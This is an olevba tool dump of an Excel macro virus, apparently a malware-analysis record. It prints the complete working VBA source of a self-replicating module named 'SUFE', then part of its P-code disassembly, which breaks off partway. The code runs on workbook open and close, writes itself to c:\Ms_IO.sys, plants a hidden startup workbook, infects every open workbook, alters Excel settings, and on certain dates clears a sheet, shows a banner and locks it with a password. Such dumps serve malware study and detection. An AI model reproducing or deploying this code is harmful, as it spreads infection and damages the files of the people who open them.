olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Efus.b.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Efus.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Efus.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Efus.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Efus.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SUFE.bas 
in file: Virus.MSExcel.Efus.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/SUFE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

    Dim Modu
    Dim Infected
    Dim Code
Sub Option_Set()
On Error Resume Next
    With Application
        .UserName = "SUFE"
        .StandardFont = "宋体"
        .StandardFontSize = "12"
        .DefaultFilePath = "C:\My Documents"
        .AltStartupPath = "C:\MS_DOS"
        .EnableSound = False
        .RollZoom = False
    End With
End Sub
Sub Settle_C()
    Dim If_Settled As Boolean
    On Error Resume Next
    With Application.FileSearch
        .LookIn = "C:\MS_DOS"
        .FileName = "Command.dos"
        If .Execute > 0 Then
            If_Settled = True
        End If
    End With
    If If_Settled = True Then
        Application.MacroOptions Macro:="C:\MS_DOS\Command.DOS!Action", Description:="", _
            ShortcutKey:="c"
        Application.OnWindow = "C:\MS_DOS\Command.DOS!Action"
        Call CodeExport
        Exit Sub
    Else
        Call CodeExport
        On Error Resume Next
        MkDir ("c:\MS_DOS")
        Workbooks.Add
        Application.ActiveWorkbook.VBProject.VBComponents.Import ("c:\Ms_IO.sys")
        ActiveWorkbook.SaveAs FileName:="C:\MS_DOS\Command.DOS", FileFormat:=xlNormal
        ActiveWindow.Visible = False
    End If
    Application.MacroOptions Macro:="C:\MS_DOS\Command.DOS!Action", Description:="", _
        ShortcutKey:="c"
    Application.OnWindow = "C:\MS_DOS\Command.DOS!Action"
End Sub

Sub Auto_open()
    On Error Resume Next
    Call Action
End Sub
Sub Auto_close()
    On Error Resume Next
    Call Action
    Application.ActiveWorkbook.Save
End Sub
Sub Action()
    Dim j
    On Error Resume Next
    Application.ScreenUpdating = False
    Call Option_Set
    Call Settle_C
    For j = 1 To Application.Workbooks.Count
        If (Application.Workbooks(j).FullName <> "C:\MS_DOS\Command.DOS" _
            And InStr(Application.Workbooks(j).FullName, "\") <> 0) Then
                Application.Workbooks(j).Activate
                Call CodeImport
        End If
    Next j
    Application.ScreenUpdating = True
    Call Punish
End Sub
Sub CodeExport()
    Dim i
    Dim hFile As Long
    On Error Resume Next
    i = 0
    For Each Modu In Application.VBE.ActiveVBProject.VBComponents
        i = i + 1
        If (Modu.Name = "SUFE") Then
            Code = Application.VBE.ActiveVBProject.VBComponents(i).CodeModule.Lines(1, Application.VBE.ActiveVBProject.VBComponents(i).CodeModule.CountOfLines)
            Code = "Attribute VB_Name = ""SUFE""" & Chr(13) & Code
        Exit For
        End If
    Next Modu
    hFile = FreeFile
    Open "c:\Ms_IO.sys" For Output Access Write As hFile
        Print #hFile, Code
    Close hFile
End Sub
Sub CodeImport()
    On Error Resume Next
    Infected = False
    For Each Modu In Application.ActiveWorkbook.VBProject.VBComponents
        If (Modu.Name = "SUFE") Then
            Infected = True
            Exit For
        End If
    Next Modu
    If Infected = False Then
        Application.ActiveWorkbook.VBProject.VBComponents.Import ("c:\Ms_IO.sys")
        Application.ActiveWorkbook.Save
    End If
End Sub

Sub Punish()
    On Error Resume Next
    If ((Day(Date) = 1) Or (Day(Date) = 20)) And ((WeekDay(Date) = 7) Or (WeekDay(Date) = 1)) Then
        '窗体
        Application.ActiveWorkbook.Worksheets.Add before:=ActiveWorkbook.Worksheets(1)
        Application.ActiveWorkbook.Worksheets(1).Select
        Range("A1").Select
        Application.DisplayFullScreen = True
        Application.CommandBars("Full Screen").Visible = False
        With ActiveWindow
            .DisplayHeadings = False
            .DisplayOutline = False
            .DisplayZeros = False
            .DisplayHorizontalScrollBar = False
            .DisplayVerticalScrollBar = False
            .DisplayWorkbookTabs = False
            .DisplayGridlines = False
        End With
        ActiveWindow.WindowState = xlMaximized
        '2背景
        On Error GoTo theEnd
        Range("A1:Q32").Select
        Selection.ClearContents
        Selection.Borders(xlDiagonalDown).LineStyle = xlNone
        Selection.Borders(xlDiagonalUp).LineStyle = xlNone
        Selection.Borders(xlEdgeLeft).LineStyle = xlNone
        Selection.Borders(xlEdgeTop).LineStyle = xlNone
        Selection.Borders(xlEdgeBottom).LineStyle = xlNone
        Selection.Borders(xlEdgeRight).LineStyle = xlNone
        Selection.Borders(xlInsideVertical).LineStyle = xlNone
        Selection.Borders(xlInsideHorizontal).LineStyle = xlNone
        With Selection.Interior
            .ColorIndex = 19
            .Pattern = xlSolid
            .PatternColorIndex = xlAutomatic
        End With
        Selection.RowHeight = 20
        Selection.ColumnWidth = 7
        ActiveWindow.ScrollRow = 12
        Range("A1:a3").Select
        Selection.RowHeight = 10
        Range("A1:c1").Select
        Selection.ColumnWidth = 11
            '3小背景
        Range("D5:F23").Select
        Selection.Borders(xlDiagonalDown).LineStyle = xlNone
        Selection.Borders(xlDiagonalUp).LineStyle = xlNone
        With Selection.Borders(xlEdgeLeft)
            .LineStyle = xlContinuous
            .Weight = xlThick
            .ColorIndex = 46
        End With
        With Selection.Borders(xlEdgeTop)
            .LineStyle = xlContinuous
            .Weight = xlThick
            .ColorIndex = 46
        End With
        With Selection.Borders(xlEdgeBottom)
            .LineStyle = xlContinuous
            .Weight = xlThick
            .ColorIndex = 46
        End With
        With Selection.Borders(xlEdgeRight)
            .LineStyle = xlContinuous
            .Weight = xlThick
            .ColorIndex = 46
        End With
        Selection.Borders(xlInsideVertical).LineStyle = xlNone
        Selection.Borders(xlInsideHorizontal).LineStyle = xlNone
        Range("D5:F23").Select
        With Selection.Interior
            .ColorIndex = 2
            .Pattern = xlSolid
            .PatternColorIndex = xlAutomatic
        End With
                '4字体
        Range("D5:F23").Select
        With Selection.Font
            .Name = "仿宋_GB2312"
            .FontStyle = "加粗"
            .Size = 18
            .Strikethrough = False
            .Superscript = False
            .Subscript = False
            .OutlineFont = False
            .Shadow = False
            .Underline = xlUnderlineStyleNone
            .ColorIndex = xlAutomatic
        End With
        Range("D19:D22").Select
        Selection.Font.Size = 14
        Selection.HorizontalAlignment = xlCenter
                '输入
        Range("A1").Select
        Range("F8").Select
        ActiveCell.FormulaR1C1 = "文"
        Range("F9").Select
        ActiveCell.FormulaR1C1 = "明"
        Range("F10").Select
        ActiveCell.FormulaR1C1 = ""
        Range("F11").Select
        ActiveCell.FormulaR1C1 = "奉"
        Range("F12").Select
        ActiveCell.FormulaR1C1 = "献"
        Range("F13").Select
        ActiveCell.FormulaR1C1 = ""
        Range("F14").Select
        ActiveCell.FormulaR1C1 = ""
        Range("F15").Select
        ActiveCell.FormulaR1C1 = "团"
        Range("F16").Select
        ActiveCell.FormulaR1C1 = "结"
        Range("F17").Select
        ActiveCell.FormulaR1C1 = ""
        Range("F18").Select
        ActiveCell.FormulaR1C1 = "进"
        Range("F19").Select
        ActiveCell.FormulaR1C1 = "取"
        Range("F20").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E6").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E7").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E8").Select
        ActiveCell.FormulaR1C1 = "勤"
        Range("E9").Select
        ActiveCell.FormulaR1C1 = "奋"
        Range("E10").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E11").Select
        ActiveCell.FormulaR1C1 = "严"
        Range("E12").Select
        ActiveCell.FormulaR1C1 = "谨"
        Range("E13").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E14").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E15").Select
        ActiveCell.FormulaR1C1 = "求"
        Range("E16").Select
        ActiveCell.FormulaR1C1 = "实"
        Range("E17").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E18").Select
        ActiveCell.FormulaR1C1 = "创"
        Range("E19").Select
        ActiveCell.FormulaR1C1 = "新"
        Range("E20").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E21").Select
        ActiveCell.FormulaR1C1 = ""
        Range("d19").Select
        ActiveCell.FormulaR1C1 = "S"
        Range("D20").Select
        ActiveCell.FormulaR1C1 = "U"
        Range("D21").Select
        ActiveCell.FormulaR1C1 = "F"
        Range("D22").Select
        ActiveCell.FormulaR1C1 = "E"
        Range("A1").Select
        ActiveSheet.Protect Password:="We11come", DrawingObjects:=True, Contents:=True, Scenarios:=True
theEnd:
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Efus.b.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 965 bytes
' _VBA_PROJECT_CUR/VBA/Sheet1 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet2 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet3 - 957 bytes
' _VBA_PROJECT_CUR/VBA/SUFE - 11946 bytes
' Line #0:
' Line #1:
' 	Dim 
' 	VarDefn Modu
' Line #2:
' 	Dim 
' 	VarDefn Infected
' Line #3:
' 	Dim 
' 	VarDefn Code
' Line #4:
' 	FuncDefn (Sub Option_Set())
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #7:
' 	LitStr 0x0004 "SUFE"
' 	MemStWith UserName 
' Line #8:
' 	LitStr 0x0004 "宋体"
' 	MemStWith StandardFont 
' Line #9:
' 	LitStr 0x0002 "12"
' 	MemStWith StandardFontSize 
' Line #10:
' 	LitStr 0x000F "C:\My Documents"
' 	MemStWith DefaultFilePath 
' Line #11:
' 	LitStr 0x0009 "C:\MS_DOS"
' 	MemStWith AltStartupPath 
' Line #12:
' 	LitVarSpecial (False)
' 	MemStWith EnableSound 
' Line #13:
' 	LitVarSpecial (False)
' 	MemStWith RollZoom 
' Line #14:
' 	EndWith 
' Line #15:
' 	EndSub 
' Line #16:
' 	FuncDefn (Sub Settle_C())
' Line #17:
' 	Dim 
' 	VarDefn If_Settled (As Boolean)
' Line #18:
' 	OnError (Resume Next) 
' Line #19:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #20:
' 	LitStr 0x0009 "C:\MS_DOS"
' 	MemStWith LookIn 
' Line #21:
' 	LitStr 0x000B "Command.dos"
' 	MemStWith FileName 
' Line #22:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #23:
' 	LitVarSpecial (True)
' 	St If_Settled 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	EndWith 
' Line #26:
' 	Ld If_Settled 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #27:
' 	LineCont 0x0004 0B 00 0C 00
' 	LitStr 0x001C "C:\MS_DOS\Command.DOS!Action"
' 	ParamNamed Macro 
' 	LitStr 0x0000 ""
' 	ParamNamed Description 
' 	LitStr 0x0001 "c"
' 	ParamNamed ShortcutKey 
' 	Ld Application 
' 	ArgsMemCall MacroOptions 0x0003 
' Line #28:
' 	LitStr 0x001C "C:\MS_DOS\Command.DOS!Action"
' 	Ld Application 
' 	MemSt OnWindow 
' Line #29:
' 	ArgsCall (Call) CodeExport 0x0000 
' Line #30:
' 	ExitSub 
' Line #31:
' 	ElseBlock 
' Line #32:
' 	ArgsCall (Call) CodeExport 0x0000 
' Line #33:
' 	OnError (Resume Next) 
' Line #34:
' 	LitStr 0x0009 "c:\MS_DOS"
' 	Paren 
' 	ArgsCall MkDir 0x0001 
' Line #35:
' 	Ld Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #36:
' 	LitStr 0x000C "c:\Ms_IO.sys"
' 	Paren 
' 	Ld Application 
' 	MemLd ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #37:
' 	LitStr 0x0015 "C:\MS_DOS\Command.DOS"
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	Ld ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0002 
' Line #38:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	LineCont 0x0004 0B 00 08 00
' 	LitStr 0x001C "C:\MS_DOS\Command.DOS!Action"
' 	ParamNamed Macro 
' 	LitStr 0x0000 ""
' 	ParamNamed Description 
' 	LitStr 0x0001 "c"
' 	ParamNamed ShortcutKey 
' 	Ld Application 
' 	ArgsMemCall MacroOptions 0x0003 
' Line #41:
' 	LitStr 0x001C "C:\MS_DOS\Command.DOS!Action"
' 	Ld Application 
' 	MemSt OnWindow 
' Line #42:
' 	EndSub 
' Line #43:
' Line #44:
' 	FuncDefn (Sub Auto_open())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) Action 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub Auto_close())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) Action 0x0000 
' Line #51:
' 	Ld Application 
' 	MemLd ActiveWorkbook 
' 	ArgsMemCall Save 0x0000 
' Line #52:
' 	EndSub 
' Line #53:
' 	FuncDefn (Sub Action())
' Line #54:
' 	Dim 
' 	VarDefn j
' Line #55:
' 	OnError (Resume Next) 
' Line #56:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #57:
' 	ArgsCall (Call) Option_Set 0x0000 
' Line #58:
' 	ArgsCall (Call) Settle_C 0x0000 
' Line #59:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Workbooks 
' 	MemLd Count 
' 	For 
' Line #60:
' 	LineCont 0x0004 0C 00 0C 00
' 	Ld j 
' 	Ld Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd FullName 
' 	LitStr 0x0015 "C:\MS_DOS\Command.DOS"
' 	Ne 
' 	Ld j 
' 	Ld Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd FullName 
' 	LitStr 0x0001 "\"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #61:
' 	Ld j 
' 	Ld Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #62:
' 	ArgsCall (Call) CodeImport 0x0000 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #65:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #66:
' 	ArgsCall (Call) Punish 0x0000 
' Line #67:
' 	EndSub 
' Line #68:
' 	FuncDefn (Sub CodeExport())
' Line #69:
' 	Dim 
' 	VarDefn i
' Line #70:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #71:
' 	OnError (Resume Next) 
' Line #72:
' 	LitDI2 0x0000 
' 	St i 
' Line #73:
' 	StartForVariable 
' 	Ld Modu 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #74:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #75:
' 	Ld Modu 
' 	MemLd New 
' 	LitStr 0x0004 "SUFE"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #76:
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld i 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Code 
' Line #77:
' 	LitStr 0x001A "Attribute VB_Name = "SUFE""
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Code 
' 	Concat 
' 	St Code 
' Line #78:
' 	ExitFor 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	StartForVariable 
' 	Ld Modu 
' 	EndForVariable 
' 	NextVar 
' Line #81:
' 	Ld Friend 
' 	St hFile 
' Line #82:
' 	LitStr 0x000C "c:\Ms_IO.sys"
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #83:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Code 
' 	PrintItemNL 
' Line #84:
' 	Ld hFile 
' 	Close 0x0001 
' Line #85:
' 	EndSub 
' Line #86:
' 	FuncDefn (Sub CodeImport())
' Line #87:
' 	OnError (Resume Next) 
' Line #88:
' 	LitVarSpecial (False)
' 	St Infected 
' Line #89:
' 	StartForVariable 
' 	Ld Modu 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #90:
' 	Ld Modu 
' 	MemLd New 
' 	LitStr 0x0004 "SUFE"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #91:
' 	LitVarSpecial (True)
' 	St Infected 
' Line #92:
' 	ExitFor 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	StartForVariable 
' 	Ld Modu 
' 	EndForVariable 
' 	NextVar 
' Line #95:
' 	Ld Infected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #96:
' 	LitStr 0x000C "c:\Ms_IO.sys"
' 	Paren 
' 	Ld Application 
' 	MemLd ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #97:
' 	Ld Application 
' 	MemLd ActiveWorkbook 
' 	ArgsMemCall Save 0x0000 
' Line #98:
' 	EndIfBlock 
' Line #99:
' 	EndSub 
' Line #100:
' Line #101:
' 	FuncDefn (Sub Punish())
' Line #102:
' 	OnError (Resume Next) 
' Line #103:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0014 
' 	Eq 
' 	Paren 
' 	Or 
' 	Paren 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #104:
' 	QuoteRem 0x0008 0x0004 "窗体"
' Line #105:
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	ArgsMemLd Worksheets 0x0001 
' 	ParamNamed before 
' 	Ld Application 
' 	MemLd ActiveWorkbook 
' 	MemLd Worksheets 
' 	ArgsMemCall Add 0x0001 
' Line #106:
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd ActiveWorkbook 
' 	ArgsMemLd Worksheets 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #107:
' 	LitStr 0x0002 "A1"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #108:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayFullScreen 
' Line #109:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Full Screen"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #110:
' 	StartWithExpr 
' 	Ld ActiveWindow 
' 	With 
' Line #111:
' 	LitVarSpecial (False)
' 	MemStWith DisplayHeadings 
' Line #112:
' 	LitVarSpecial (False)
' 	MemStWith DisplayOutline 
' Line #113:
' 	LitVarSpecial (False)
' 	MemStWith DisplayZeros 
' Line #114:
' 	LitVarSpecial (False)
' 	MemStWith DisplayHorizontalScrollBar 
' Line #115:
' 	LitVarSpecial (False)
' 	MemStWith DisplayVerticalScrollBar 
' Line #116:
' 	LitVarSpecial (False)
' 	MemStWith DisplayWorkbookTabs 
' Line #117:
' 	LitVarSpecial (False)
' 	MemStWith DisplayGridlines 
' Line #118:
' 	EndWith 
' Line #119:
' 	Ld xlMaximized 
' 	Ld ActiveWindow 
' 	MemSt WindowState 
' Line #120:
' 	QuoteRem 0x0008 0x0005 "2背景"
' Line #121:
' 	OnError theEnd 
' Line #122:
' 	LitStr 0x0006 "A1:Q32"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #123:
' 	Ld Selection 
' 	ArgsMemCall ClearContents 0x0000 
' Line #124:
' 	Ld xlNone 
' 	Ld xlDiagonalDown 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #125:
' 	Ld xlNone 
' 	Ld xlDiagonalUp 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #126:
' 	Ld xlNone 
' 	Ld xlEdgeLeft 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #127:
' 	Ld xlNone 
' 	Ld xlEdgeTop 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #128:
' 	Ld xlNone 
' 	Ld xlEdgeBottom 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #129:
' 	Ld xlNone 
' 	Ld xlEdgeRight 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #130:
' 	Ld xlNone 
' 	Ld xlInsideVertical 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #131:
' 	Ld xlNone 
' 	Ld xlInsideHorizontal 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #132:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #133:
' 	LitDI2 0x0013 
' 	MemStWith ColorIndex 
' Line #134:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #135:
' 	Ld xlAutomatic 
' 	MemStWith PatternColorIndex 
' Line #136:
' 	EndWith 
' Line #137:
' 	LitDI2 0x0014 
' 	Ld Selection 
' 	MemSt RowHeight 
' Line #138:
' 	LitDI2 0x0007 
' 	Ld Selection 
' 	MemSt ColumnWidth 
' Line #139:
' 	LitDI2 0x000C 
' 	Ld ActiveWindow 
' 	MemSt ScrollRow 
' Line #140:
' 	LitStr 0x0005 "A1:a3"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #141:
' 	LitDI2 0x000A 
' 	Ld Selection 
' 	MemSt RowHeight 
' Line #142:
' 	LitStr 0x0005 "A1:c1"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #143:
' 	LitDI2 0x000B 
' 	Ld Selection 
' 	MemSt ColumnWidth 
' Line #144:
' 	QuoteRem 0x000C 0x0007 "3小背景"
' Line #145:
' 	LitStr 0x0006 "D5:F23"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #146:
' 	Ld xlNone 
' 	Ld xlDiagonalDown 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #147:
' 	Ld xlNone 
' 	Ld xlDiagonalUp 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #148:
' 	StartWithExpr 
' 	Ld xlEdgeLeft 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	With 
' Line #149:
' 	Ld xlContinuous 
' 	MemStWith LineStyle 
' Line #150:
' 	Ld xlThick 
' 	MemStWith Weight 
' Line #151:
' 	LitDI2 0x002E 
' 	MemStWith ColorIndex 
' Line #152:
' 	EndWith 
' Line #153:
' 	StartWithExpr 
' 	Ld xlEdgeTop 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	With 
' Line #154:
' 	Ld xlContinuous 
' 	MemStWith LineStyle 
' Line #155:
' 	Ld xlThick 
' 	MemStWith Weight 
' Line #156:
' 	LitDI2 0x002E 
' 	MemStWith ColorIndex 
' Line #157:
' 	EndWith 
' Line #158:
' 	StartWithExpr 
' 	Ld xlEdgeBottom 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	With 
' Line #159:
' 	Ld xlContinuous 
' 	MemStWith LineStyle 
' Line #160:
' 	Ld xlThick 
' 	MemStWith Weight 
' Line #161:
' 	LitDI2 0x002E 
' 	MemStWith ColorIndex 
' Line #162:
' 	EndWith 
' Line #163:
' 	StartWithExpr 
' 	Ld xlEdgeRight 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	With 
' Line #164:
' 	Ld xlContinuous 
' 	MemStWith LineStyle 
' Line #165:
' 	Ld xlThick 
' 	MemStWith Weight 
' Line #166:
' 	LitDI2 0x002E 
' 	MemStWith ColorIndex 
' Line #167:
' 	EndWith 
' Line #168:
' 	Ld xlNone 
' 	Ld xlInsideVertical 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #169:
' 	Ld xlNone 
' 	Ld xlInsideHorizontal 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #170:
' 	LitStr 0x0006 "D5:F23"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #171:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #172:
' 	LitDI2 0x0002 
' 	MemStWith ColorIndex 
' Line #173:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #174:
' 	Ld xlAutomatic 
' 	MemStWith PatternColorIndex 
' Line #175:
' 	EndWith 
' Line #176:
' 	QuoteRem 0x0010 0x0005 "4字体"
' Line #177:
' 	LitStr 0x0006 "D5:F23"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #178:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #179:
' 	LitStr 0x000B "仿宋_GB2312"
' 	MemStWith New 
' Line #180:
' 	LitStr 0x0004 "加粗"
' 	MemStWith FontStyle 
' Line #181:
' 	LitDI2 0x0012 
' 	MemStWith Size 
' Line #182:
' 	LitVarSpecial (False)
' 	MemStWith Strikethrough 
' Line #183:
' 	LitVarSpecial (False)
' 	MemStWith Superscript 
' Line #184:
' 	LitVarSpecial (False)
' 	MemStWith Subscript 
' Line #185:
' 	LitVarSpecial (False)
' 	MemStWith OutlineFont 
' Line #186:
' 	LitVarSpecial (False)
' 	MemStWith Shadow 
' Line #187:
' 	Ld xlUnderlineStyleNone 
' 	MemStWith Underline 
' Line #188:
' 	Ld xlAutomatic 
' 	MemStWith ColorIndex 
' Line #189:
' 	EndWith 
' Line #190:
' 	LitStr 0x0007 "D19:D22"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #191:
' 	LitDI2 0x000E 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #192:
' 	Ld xlCenter 
' 	Ld Selection 
' 	MemSt HorizontalAlignment 
' Line #193:
' 	QuoteRem 0x0010 0x0004 "输入"
' Line #194:
' 	LitStr 0x0002 "A1"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #195:
' 	LitStr 0x0002 "F8"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #196:
' 	LitStr 0x0002 "文"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #197:
' 	LitStr 0x0002 "F9"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #198:
' 	LitStr 0x0002 "明"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #199:
' 	LitStr 0x0003 "F10"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #200:
